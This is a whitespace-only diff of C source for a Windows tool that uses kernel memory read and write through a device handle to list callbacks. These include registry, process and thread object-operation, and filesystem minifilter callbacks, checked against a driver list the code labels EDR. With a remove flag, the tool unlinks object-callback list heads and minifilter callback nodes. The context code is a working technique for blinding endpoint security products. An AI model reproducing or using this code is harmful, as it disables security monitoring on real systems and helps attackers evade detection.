@@ -83,7 +83,7 @@ _cleanUp:
 
 // List and sort all kernel drivers, used to check if kernel callback address is in their address space, outputs a pointer to list of kernel drivers, 8 bytes each.
 BOOL ListAndSortKernelDrivers(OUT LPVOID* ppDrivers, OUT DWORD* pdwDriverCount) {
-	
+
 	BOOL	bSTATE						= TRUE;
 	LPVOID* pDrivers					= NULL;     // Allocated buffer to hold driver base addresses
 	DWORD	cbNeeded					= 0;        // Bytes needed to hold driver list
@@ -164,7 +164,7 @@ BOOL isDriverListed(IN LPSTR lpstrDriverName) {
 	BOOL bSTATE = FALSE;
 
 	for (int i = 0; i < numDrivers; i++) {
-		
+
 		// Case-insensitive string comparison
 		// https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/stricmp-stricmp-l-wcsicmp-wcsicmp-l?view=msvc-170
 		if (_stricmp(driverNames[i], lpstrDriverName) == 0) {
@@ -302,19 +302,19 @@ BOOL ListOrRemoveKCRegistryOperations(IN HANDLE hDevice, IN LPSTR lpstrCallbackT
 
 			// Check if PRE callback lies within known driver memory range
 			if (dwCallbackFunc > dwDriverBase && dwCallbackFunc < (DWORD64)lpDrivers[j + 1]) {
-				
+
 				// https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-getdevicedriverbasenamea
 				GetDeviceDriverBaseNameA((LPVOID)dwDriverBase, szDeviceName, sizeof(szDeviceName));
-				
+
 				if (isDriverListed(szDeviceName)) {
 					SetConsoleTextAttribute(hOutput, FOREGROUND_RED);
-					
+
 					// Cant overwrite these values due to patchguard
 					//if (bRemove == TRUE) {
 					//	WriteMemoryDWORD64(hDevice, dwCurrentEntry + 0x20, 0x0000000000000000);
 					//}
 				}
-				
+
 				info_t("[%llx]: %llx -> [%s + %llx]", dwCurrentEntry, dwCallbackFunc, szDeviceName, dwCallbackFunc - dwDriverBase);
 				SetConsoleTextAttribute(hOutput, 7);
 				break;
@@ -377,92 +377,92 @@ BOOL ListOrRemoveKCObjectOperations(IN HANDLE hDevice, IN LPSTR lpstrCallbackTyp
 
 	// Read the FLINK from the head
 	dwCurrentEntry = ReadMemoryDWORD64(hDevice, dwListHead);
-	
+
 	while (dwCurrentEntry != dwListHead && dwCurrentEntry != 0) {
-	
+
 		// Read both callback function pointers (0x28 and 0x30 for W11) Might be 0x20 and 0x28 for older versions
 		dwPreCallbackFunc = ReadMemoryDWORD64(hDevice, dwCurrentEntry + 0x28); // Pre-operation callback
 		dwPostCallbackFunc = ReadMemoryDWORD64(hDevice, dwCurrentEntry + 0x30); // Post-operation callback
-	
+
 		info_t("Callback Entry %llx", dwCurrentEntry);
-	
+
 		// Reset matched flags
 		bPreMatched = FALSE;
 		bPostMatched = FALSE;
-	
+
 		// Match PRE and POST callback to known drivers
 		for (DWORD j = 0; j < dwDriverCount - 1; j++) {
-	
+
 			dwDriverBase = (DWORD64)lpDrivers[j];
-	
+
 			// Check if PRE callback lies within known driver memory range
 			if (dwPreCallbackFunc > dwDriverBase && dwPreCallbackFunc < (DWORD64)lpDrivers[j + 1]) {
-	
+
 				// https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-getdevicedriverbasenamea
 				GetDeviceDriverBaseNameA((LPVOID)dwDriverBase, szDeviceName, sizeof(szDeviceName));
-	
+
 				if (isDriverListed(szDeviceName)) {
 					SetConsoleTextAttribute(hOutput, FOREGROUND_RED);
-	
+
 					// Cant overwrite these values due to patchguard
 					//if (bRemove == TRUE) {
 					//	WriteMemoryDWORD64(hDevice, dwCurrentEntry + 0x20, 0x0000000000000000);
 					//}
 				}
-	
+
 				info_t("\t[PRE] %llx -> [%s + %llx]", dwPreCallbackFunc, szDeviceName, dwPreCallbackFunc - dwDriverBase);
 				SetConsoleTextAttribute(hOutput, 7);
 				bPreMatched = TRUE;
 				break;
 			}
 		}
-	
+
 		// Print unresolved PRE if not in known kernel module
 		if (!bPreMatched) {
 			info_t("\t[PRE] %llx", dwPreCallbackFunc);
 		}
-	
+
 		for (DWORD j = 0; j < dwDriverCount - 1; j++) {
-	
+
 			dwDriverBase = (DWORD64)lpDrivers[j];
-	
+
 			// Check if POST callback lies within known driver memory range
 			if (dwPostCallbackFunc > dwDriverBase && dwPostCallbackFunc < (DWORD64)lpDrivers[j + 1]) {
-	
+
 				// https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-getdevicedriverbasenamea
 				GetDeviceDriverBaseNameA((LPVOID)dwDriverBase, szDeviceName, sizeof(szDeviceName));
-	
+
 				if (isDriverListed(szDeviceName)) {
 					SetConsoleTextAttribute(hOutput, FOREGROUND_RED);
-	
+
 					// Cant overwrite these values due to patchguard
 					//if (bRemove == TRUE) {
 						//WriteMemoryDWORD64(hDevice, dwCurrentEntry + 0x28, 0x0000000000000000);
 					//}
 				}
-	
+
 				info_t("\t[POST] %llx -> [%s + %llx]", dwPostCallbackFunc, szDeviceName, dwPostCallbackFunc - dwDriverBase);
 				SetConsoleTextAttribute(hOutput, 7);
 				bPostMatched = TRUE;
 				break;
 			}
 		}
-	
+
 		// Print unresolved POST if not in known kernel module
 		if (!bPostMatched) {
 			info_t("\t[POST] %llx", dwPostCallbackFunc);
 		}
-	
+
 		// Move to next LIST_ENTRY
 		dwCurrentEntry = ReadMemoryDWORD64(hDevice, dwCurrentEntry);
 	}
-	
+
 	// Make the flink and blink point to dwListHead (itself)
 	if (bRemove == TRUE) {
-	
+
 		// Flink
 		WriteMemoryDWORD64(hDevice, dwListHead, dwListHead);
-	
+
 		// Blink
 		WriteMemoryDWORD64(hDevice, dwListHead + 0x8, dwListHead);
 
@@ -514,13 +514,13 @@ BOOL ListOrRemoveMiniFiltersCallbacks(IN HANDLE hDevice, IN LPSTR lpstrCallbackT
 	// Loop over all instances (disks)
 	while (dwCurrentFrameEntry != dwFrameListHead && dwCurrentFrameEntry != 0) {
 
-		// Get the base address of the current frame 
+		// Get the base address of the current frame
 		// dt fltmgr!_FLTP_FRAME Links
 		//    +0x008 Links : _LIST_ENTRY
 		// dt fltmgr!_FLTP_FRAME ffffca04`cd54e018-0x008
 		DWORD64 dwCurrentFrameBase = dwCurrentFrameEntry - g_fltMgrOffsets.st._FLTP_FRAME_Links;
 		info_t("\t_FLTP_FRAME: %016llx", dwCurrentFrameBase);
-		
+
 		// Enumerate the filters in this frame
 		// dt fltmgr!_FLTP_FRAME ffffca04`cd54e018-0x008
 		//		+0x048 RegisteredFilters : _FLT_RESOURCE_LIST_HEAD
@@ -536,7 +536,7 @@ BOOL ListOrRemoveMiniFiltersCallbacks(IN HANDLE hDevice, IN LPSTR lpstrCallbackT
 		//printf("[DEBUG] dwCurrentFilterEntry %llx\n", dwCurrentFilterEntry);
 
 		// Loop over all the filters
-		while (dwCurrentFilterEntry != dwFilterListHead && dwCurrentFilterEntry != 0) {		
+		while (dwCurrentFilterEntry != dwFilterListHead && dwCurrentFilterEntry != 0) {
 
 			// Get the current filter base address
 			// dt fltmgr!_FLT_OBJECT PrimaryLink
@@ -554,7 +554,7 @@ BOOL ListOrRemoveMiniFiltersCallbacks(IN HANDLE hDevice, IN LPSTR lpstrCallbackT
 			//printf("[DEBUG] dwDriverObject %llx\n", dwDriverObject);
 
 			// dt fltmgr!_DRIVER_OBJECT DriverInit
-			//		+0x058 DriverInit : Ptr64     long 
+			//		+0x058 DriverInit : Ptr64     long
 			// dt fltmgr!_DRIVER_OBJECT ffffca04`d0a74c70+0x058
 			// dps ffffca04`d0a74c70+0x058 L1
 			DWORD64 dwDriverInit = ReadMemoryDWORD64(hDevice, dwDriverObject + g_fltMgrOffsets.st._DRIVER_OBJECT_DriverInit);
@@ -620,13 +620,13 @@ BOOL ListOrRemoveMiniFiltersCallbacks(IN HANDLE hDevice, IN LPSTR lpstrCallbackT
 					DWORD dwNodesFound = 0;
 
 					for (int k = 0; k < 50; k++) {
-						
+
 						// Read the callbacknode pointer
 						DWORD64 dwCallbackNode = ReadMemoryDWORD64(hDevice, dwCallbackNodesArray + (k * sizeof(PVOID)));
-						
+
 						if (dwCallbackNode == 0) {
 							continue;
-						}	
+						}
 
 						// Heuristic: ensure this node is still linked (sanity check)
 						// Blink->Flink == this && Flink->Blink == this
@@ -653,7 +653,7 @@ BOOL ListOrRemoveMiniFiltersCallbacks(IN HANDLE hDevice, IN LPSTR lpstrCallbackT
 
 					if (dwNodesFound == 0) {
 						info_t("\t\t\t\tCallbackNodes not found");
-					}	
+					}
 					else if (dwNodesFound != 0 && bRemove == TRUE) {
 						info_t("\t\t\t\tCallbackNodes: %d found and delinked", dwNodesFound);
 					}
@@ -666,7 +666,7 @@ BOOL ListOrRemoveMiniFiltersCallbacks(IN HANDLE hDevice, IN LPSTR lpstrCallbackT
 
 				}
 			} // END of if EDR statement
-		
+
 			// Move to next LIST_ENTRY of filters
 			dwCurrentFilterEntry = ReadMemoryDWORD64(hDevice, dwCurrentFilterEntry);
 		}
@@ -691,7 +691,7 @@ BOOL ListOrRemoveKernelCallbacks(IN BOOL bRemove) {
 	DWORD64		dwfltMgrBaseAddress						= 0;	// Stores base address of fltMgr.sys
 	HANDLE		hDevice									= NULL; // Saves handle to the device driver
 	DWORD64		dwPspCreateProcessNotifyRoutineArray	= 0;	// Base address of PspCreateProcessNotifyRoutineArray
-	DWORD64		dwPspCreateThreadNotifyRoutineArray		= 0;	// Base address of dwPspCreateThreadNotifyRoutineArray	
+	DWORD64		dwPspCreateThreadNotifyRoutineArray		= 0;	// Base address of dwPspCreateThreadNotifyRoutineArray
 	DWORD64		dwPspLoadImageNotifyRoutineArray		= 0;	// Base address of dwPspLoadImageNotifyRoutineArray
 	DWORD64		dwCallbackListHead						= 0;	// Base address of dwCallbackListHead
 	DWORD64		dwPsProcessType							= 0;	// Base address of dwPsProcessType
@@ -790,7 +790,7 @@ BOOL ListOrRemoveKernelCallbacks(IN BOOL bRemove) {
 	// List and or remove Object Operations kernel callbacks for process
 	printf("\n");
 	ListOrRemoveKCObjectOperations(hDevice, "Process Object Operations", dwPsProcessType, pDrivers, dwDriverCount, bRemove);
-	
+
 	// List and or remove Object Operations kernel callbacks for threads
 	printf("\n");
 	ListOrRemoveKCObjectOperations(hDevice, "Thread Object Operations", dwPsThreadType, pDrivers, dwDriverCount, bRemove);
